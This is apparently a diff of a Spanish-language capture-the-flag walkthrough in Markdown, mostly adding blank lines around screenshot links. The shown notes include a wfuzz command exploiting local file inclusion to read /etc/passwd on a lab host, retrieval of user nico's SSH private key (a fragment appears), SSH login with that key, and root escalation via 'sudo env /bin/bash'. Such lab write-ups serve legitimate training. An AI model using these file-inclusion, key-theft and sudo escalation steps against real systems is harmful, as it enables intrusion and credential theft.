@@ -10,18 +10,23 @@
 
 **LFI**
 `wfuzz -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/ejemplos.php?FUZZ=../../../../../etc/passwd  --hl=15`
+
 ![Pasted image 20250125171448](../../Fotos/Pasted%20image%2020250125171448.png)
 
 *Otra forma era revisarla URL era bastante intuitiva el LFI*
+
 ![Pasted image 20250125171547](../../Fotos/Pasted%20image%2020250125171547.png)
 
 ![Pasted image 20250125171616](../../Fotos/Pasted%20image%2020250125171616.png)
+
 - Encontramos un usuario nico
 
 Con fuerza bruta es posible en teoria sacar la clave pero en nuestro caso personal no nos permitio de ninguna manera hasta el momento por ende pasaremos  a otro metodo
+
 ![Pasted image 20250125172630](../../Fotos/Pasted%20image%2020250125172630.png)
 
 Enumeraremos par la web mediante LFI la id_rsa del usuario nico
+
 ![Pasted image 20250125172926](../../Fotos/Pasted%20image%2020250125172926.png)
 
 ![Pasted image 20250125172932](../../Fotos/Pasted%20image%2020250125172932.png)
@@ -68,9 +73,11 @@ ayyxi3hh3t9P8AAAARbmljb0AzYTQ4YjEyYjU3YTIBAg==
 ```
 
 `ssh -i id_rsa -p 22 nico@172.17.0.2`
+
 ![Pasted image 20250125180311](../../Fotos/Pasted%20image%2020250125180311.png)
 
 ![Pasted image 20250125180341](../../Fotos/Pasted%20image%2020250125180341.png)
+
 
 `sudo env /bin/bash`
 ![Pasted image 20250125180454](../../Fotos/Pasted%20image%2020250125180454.png)
